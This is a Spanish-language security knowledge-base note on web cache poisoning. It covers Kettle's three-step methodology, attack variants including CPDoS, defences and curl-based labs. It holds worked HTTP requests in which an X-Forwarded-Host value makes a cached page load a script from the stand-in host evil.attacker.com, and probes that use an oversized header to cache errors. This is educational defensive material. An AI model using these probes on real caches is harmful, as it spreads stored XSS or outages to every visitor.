---
type: concept
status: active
created: 2026-06-03
updated: 2026-06-03
tags:
  - cybersecurity
  - web-security
  - web-cache-poisoning
  - caching
  - http
sources: []
---

# Envenenamiento de caché web

## Definición
El envenenamiento de caché web (web cache poisoning) es un ataque que hace que una **caché compartida almacene una response dañina**, que la caché luego sirve a cada usuario posterior que pide la misma clave de caché. El mecanismo es un desajuste: el atacante manipula un **input sin clave** (un header, parámetro o rareza que el origin refleja en la response) mientras la caché almacena el resultado bajo una clave que *excluye* ese input. Una request del atacante por lo tanto se le sirve a muchas víctimas que envían requests enteramente "normales". Este es el análisis ofensivo profundo de la clase 2 de [[cybersecurity/networking/caching-and-security|caché y seguridad]]; la nota padre tiene la taxonomía más amplia de seis clases y la política de headers del defensor.

## Por qué importa
Una caché convierte un bug reflejado solo-para-uno en un bug almacenado-para-todos. Esa amplificación es todo el peligro:

- **Alcance: una request envenena a muchos usuarios.** Un valor reflejado que normalmente solo afectaría la propia página del atacante se vuelve un payload almacenado servido desde el edge a cada visitante en esa clave de caché — XSS, redirects o denegación a escala de población.
- **La clave de caché *es* la frontera de seguridad.** La lección recurrente de la nota padre se afina acá: si el origin lee una señal por la que la caché no varía, la caché le sirve la interpretación de un usuario a otro. El envenenamiento de caché web es la explotación sistemática de ese hueco.
- **Es una metodología, no un payload.** La investigación de James Kettle lo reencuadró de una curiosidad a un proceso repetible de tres pasos (encontrar un input sin clave → volverlo dañino → lograr que se cachee). Tener ese loop te deja testear cualquier stack de caché, que es por lo que esta nota tiene forma de metodología.

## Cómo funciona
El ataque tiene **2 precondiciones** — un input sin clave que influye en la response, y una response cacheable — explotadas vía la **metodología de 3 pasos** de Kettle:

1. **Identificar un input sin clave.** Agregá headers/parámetros candidatos y mirá si la response *cambia* mientras la clave de caché *no* (compará `X-Cache: miss/hit`, `Age`). Los inputs sin clave clásicos son `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Port`, `X-Host`, `X-Original-URL` y `Forwarded`.
2. **Provocar una response dañina.** Llevá ese input a producir algo peligroso reflejado en la página — un script/`src` controlado por el atacante, un open redirect, una inyección de header o un error.
3. **Lograr que se cachee.** Confirmá que la response es cacheable y aterrizala en una clave que las víctimas vayan a pedir, para que el veneno se les sirva a otros.

Una sonda trabajada (notá el cache-buster `cb` — ver *Técnicas* para por qué es obligatorio):

```http
GET /en?cb=8f3a1 HTTP/1.1
Host: www.example.com
X-Forwarded-Host: evil.attacker.com

HTTP/1.1 200 OK
Cache-Control: public, max-age=300
X-Cache: miss
...
<link rel="canonical" href="https://evil.attacker.com/en?cb=8f3a1">
<script src="https://evil.attacker.com/static/main.js"></script>   <!-- reflejado y weaponizable -->
```

Una segunda request a la *misma* URL **sin** header devuelve `X-Cache: hit` y todavía sirve el script de `evil.attacker.com` — un XSS almacenado para todos en esa clave:

```http
GET /en?cb=8f3a1 HTTP/1.1
Host: www.example.com

HTTP/1.1 200 OK
X-Cache: hit
...
<script src="https://evil.attacker.com/static/main.js"></script>   <!-- servido a las víctimas -->
```

El bug no es que exista una caché; es que la clave de caché omite un input en el que el origin confía. La caché convierte un bug reflejado normalmente solo-para-uno en un bug almacenado, servido-a-todos.

## Técnicas / patrones
- **Testeá siempre con un cache-buster.** Agregá un valor de query único (`?cb=<random>`) para envenenar solo *tu propia* clave y nunca a usuarios reales. Envenenar una clave de producción sin un buster es dañar a transeúntes — la regla cardinal de seguridad de esta clase.
- **Cazá inputs sin clave sistemáticamente.** Rociá wordlists de headers (Param Miner de Burp) buscando inputs que cambien la response pero no la clave: variantes de forwarded-host/scheme/port, `X-Original-URL`/`X-Rewrite-URL`, cookies y `Accept-Language`.
- **Confirmá la caché, después la clave.** Leé `X-Cache`, `CF-Cache-Status`, `Age` y `X-Served-By` para saber si una response está cacheada y qué incluye la clave. Sin caché, sin poisoning.
- **Encontrá dónde aterrizan los reflejos.** Links canónicos, redirects, URLs de `<script>`/`<link>` importados, tags Open Graph y páginas de error son los sinks de reflejo de alto valor.
- **Fingerprinteá la caché.** Cloudflare, Fastly/Varnish, Akamai y Nginx normalizan las claves distinto (casing, encoding, delimitadores, puertos por defecto) — los huecos de normalización son los vectores de cache-key-flaw.
- **Un reflejo débil igual envenena.** Incluso un input sin clave que solo cambie un target de redirect o dispare un error es un vector viable (open-redirect o cache-poisoned DoS).

## Variantes y bypasses
**5 familias** de envenenamiento de caché web.

### 1. Envenenamiento por header sin clave (canónico)
`X-Forwarded-Host`/`X-Forwarded-Scheme`/`X-Forwarded-Port` reflejados en URLs absolutas (tags canónicos, redirects, scripts importados) pero ausentes de la clave de caché. Envenená la caché para que las víctimas carguen el host del atacante → XSS almacenado o importación de script malicioso.

### 2. Inputs sin clave de query, cookie o puerto
Inputs más allá de los headers — un parámetro de query reflejado que la caché quita de la clave, una cookie sin clave, o un puerto que la caché ignora — llevan al mismo resultado de reflejo-en-caché.

### 3. Fallas de normalización de clave de caché e inyección de clave de caché (Web Cache Entanglement)
Discrepancias en cómo la caché normaliza la clave versus el origin (case-folding, URL-encoding, manejo de delimitadores, parámetros con `;`) le dejan al atacante aterrizar una response envenenada en una clave a la que las requests *normales* de la víctima resuelven. La investigación "Web Cache Entanglement" de Kettle generalizó esto más allá de los simples headers sin clave.

### 4. Fat GET y parameter cloaking
La caché usa la URL como clave, pero el origin también lee el *body* de la request GET o trata los parámetros delimitados por `&`/`;` distinto que la caché — smuggleando un input sin clave pasando la clave.

### 5. Denegación de servicio por caché envenenada (CPDoS)
En vez de XSS, envenená la caché con un *error*: un header de request sobredimensionado o malformado hace que el origin emita un `400`/`404`/`502` que la caché almacena y sirve a todos los usuarios de la clave (Nguyen et al., "Cache-Poisoned Denial-of-Service," CCS 2019 — https://cpdos.org/). Impacto de disponibilidad sin ningún payload reflejado.

> Distinto de la **cache deception** (lo inverso: engañar a la caché para que almacene contenido *dinámico personalizado* bajo una clave de apariencia estática) — cubierto como clase hermana en [[cybersecurity/networking/caching-and-security|caché y seguridad]].

## Impacto
Ordenado por severidad:

- **XSS almacenado masivo.** Un script/`src` envenenado servido desde el edge corre en el navegador de cada visitante en esa clave — compromiso del cliente a escala de población.
- **Redirect / importación de script malicioso masivo.** Las víctimas son enviadas a, o cargan código de, el host del atacante.
- **Robo de credenciales o tokens.** El contenido envenenado cosecha sesiones, tokens CSRF o artefactos OAuth de muchos usuarios.
- **DoS por caché envenenada.** Un error cacheado le niega el recurso a todos los usuarios de la clave hasta la expiración del TTL o el purge.
- **Persistencia y arrastre en IR.** El veneno sobrevive hasta que la caché (a menudo distribuida) se purga — la remediación es más lenta que arreglar el origin.

## Detección y defensa
Ordenado por efectividad:

1. **No reflejes input controlado por la request en responses cacheables.**
   El arreglo estructural. Si el origin nunca refleja `X-Forwarded-Host` y compañía en el body/headers de una response cacheable, no hay nada que envenenar. Donde el reflejo es inevitable, validá contra una allowlist (p. ej., un host canónico fijo).

2. **Hacé que la clave de caché incluya todo input en el que el origin confía.**
   Cualquier señal que el origin lea y esté ausente de la clave es un candidato a poisoning. Configurá la clave de caché del CDN explícitamente para cubrir los headers/parámetros que el origin realmente usa — usá como clave lo que confiás.

3. **Deshabilitá el caché para responses que varían por inputs sin clave.**
   `Cache-Control: no-store` / `private` para responses cuyo contenido depende de inputs que no podés usar como clave de forma segura. No dejes que contenido dinámico, dependiente del input, entre a una caché compartida.

4. **Normalizá de forma consistente entre caché y origin.**
   Alineá el case-folding, el URL-decoding, el manejo de delimitadores, las barras finales y los puertos por defecto para que se cierren los vectores de cache-key-flaw y fat-GET.

5. **Quitá los headers de request inesperados en el edge.**
   Remové `X-Forwarded-Host`, `X-Original-URL` y otros headers de ruteo provistos por el cliente antes de que lleguen al origin salvo que un camino probadamente-seguro los necesite.

6. **Logueá el estado de caché con contexto de seguridad.**
   Registrá HIT/MISS/BYPASS, los inputs de la clave de caché y el estado autenticado vs anónimo para que el poisoning no parezca un reporte de XSS aleatorio e irreproducible.

### Qué no funciona como defensa primaria
- **Solo validación/saneamiento de input.** Sanear el valor reflejado puede frenar el XSS pero no un *redirect* cacheado ni un *error* de caché envenenada; el canal de poisoning (input sin clave + caché) sigue abierto.
- **`Vary` como arreglo.** Muchos intermediarios ignoran o comprimen `Vary`; no es una frontera de seguridad confiable (ver la nota padre).
- **Confiar en los defaults del CDN.** Los CDNs optimizan para el rendimiento de cache-hit; el comportamiento de clave de caché seguro debe configurarse intencionalmente.
- **Testear una sola request.** El poisoning necesita dos perspectivas — almacenar como el atacante, recuperar como una víctima — así que el testeo de una sola request se lo pierde por completo.

## Labs prácticos
Corré solo contra sistemas que sean tuyos o que estés autorizado a testear. Usá **siempre** un cache-buster para envenenar solo tu propia clave.

### Sondear un header reflejado y sin clave
```bash
url='https://app.example.com/?cb=lab1'
curl -sk "$url" -H 'X-Forwarded-Host: poison.example' | rg -i 'poison.example'
# Si poison.example se refleja (en canonical/redirect/script), es un candidato.
```

### Confirmar que el input es sin clave y la response está cacheada
```bash
url='https://app.example.com/?cb=lab2'
curl -skI "$url" -H 'X-Forwarded-Host: poison.example' | rg -i 'x-cache|cf-cache-status|age|cache-control'
curl -skI "$url" | rg -i 'x-cache|cf-cache-status|age'   # segunda request: HIT con el veneno = sin clave
```

### Testear una forma de poisoning de dos requests (en tu propia clave de cache-buster)
```bash
url='https://app.example.com/?cb=lab3'
curl -sk  "$url" -H 'X-Forwarded-Host: poison.example' >/dev/null   # almacenar
curl -sk  "$url" | rg -i 'poison.example'                           # recuperar como request limpia
# Una request limpia que devuelve poison.example = poisoning confirmado de esa clave.
```

### Sondear cache-poisoned DoS (con cuidado, solo lab propio)
```bash
# Un header sobredimensionado/malformado que el origin rechaza pero la caché almacena:
curl -skI 'https://app.example.com/?cb=lab4' -H "X-Oversized: $(printf 'A%.0s' {1..8000})" | rg -i 'http/|x-cache|age'
# Vigilá un 4xx cacheado que una request limpia posterior también reciba.
```

## Ejemplos prácticos
- **`X-Forwarded-Host` → XSS almacenado.** Un sitio refleja el header en un `<script src>`; un atacante envenena la caché de la homepage para que cada visitante cargue el JS del atacante — el caso canónico de Kettle.
- **`X-Forwarded-Scheme` → redirect cacheado.** Reflejado en un redirect, loopea a las víctimas o las envía a un host atacante, servido desde caché.
- **Falla de normalización de clave de caché.** Una discrepancia de casing/encoding (Web Cache Entanglement) aterriza una response envenenada en la clave a la que resuelven las requests ordinarias, sin ningún header sin clave obvio.
- **Caída por CPDoS.** Un header sobredimensionado envenena un `400` sobre la clave de un asset crítico; todos los usuarios de ese nodo de edge reciben el error hasta el purge.
- **CDN envenenado sirviendo JS malicioso.** Un hallazgo de clase bug-bounty donde una request hace que un CDN sirva script controlado por el atacante a toda la población de visitantes en esa ruta.

## Notas relacionadas
- [[cybersecurity/networking/caching-and-security|Caché y seguridad]] — el padre; la taxonomía de caché de seis clases y la política de headers del defensor cuya clase 2 esta nota analiza a fondo.
- [[request-smuggling|Request smuggling]] — el desacuerdo de parsers puede envenenar cachés compartidas y colas de requests; el linaje de investigación adyacente de Kettle.
- [[xss|XSS]] — el payload usual entregado por una response envenenada.
- [[open-redirect|Open redirect]] — un resultado frecuente del poisoning cuando el input reflejado alimenta un redirect.
- [[content-security-policy|Content Security Policy]] — limita el radio de explosión de una importación de script envenenada (defensa en profundidad, no un arreglo).
- [[same-origin-policy|Política del mismo origen]] — por qué un script same-origin envenenado es tan poderoso: corre *dentro* del origen.
- [[cybersecurity/networking/http-headers|Headers HTTP]] — semántica de `Cache-Control`, `Vary`, `Age` y `X-Forwarded-*`.
- [[cybersecurity/networking/reverse-proxies|Reverse proxies]] — donde viven las cachés compartidas en el camino de la request.
- [[cybersecurity/foundations/attacker-defender-duality-as-a-learning-tool|La dualidad atacante-defensor]] — poisoning vs higiene de clave de caché desde sillas opuestas.

### Notas atómicas futuras sugeridas
- [[cache-deception|Cache deception]]
- [[cache-poisoning-dos|Cache poisoning DoS]]
- [[host-header-attacks|Ataques de host-header]]
- [[param-miner-and-unkeyed-input-discovery|Param Miner y descubrimiento de inputs sin clave]]

> Las notas atómicas futuras se listan como `[[wikilinks]]` aunque el archivo destino todavía no exista, para que registren como forward-links en Obsidian.

## Referencias
- **Research / Deep Dive:** James Kettle (PortSwigger) — Practical Web Cache Poisoning — https://portswigger.net/research/practical-web-cache-poisoning
- **Testing / Lab:** PortSwigger Web Security Academy — Web cache poisoning — https://portswigger.net/web-security/web-cache-poisoning
- **Research / Deep Dive:** James Kettle (PortSwigger) — Web Cache Entanglement: Novel Pathways to Poisoning — https://portswigger.net/research/web-cache-entanglement
- **Foundational:** RFC 9111 — HTTP Caching — https://www.rfc-editor.org/rfc/rfc9111
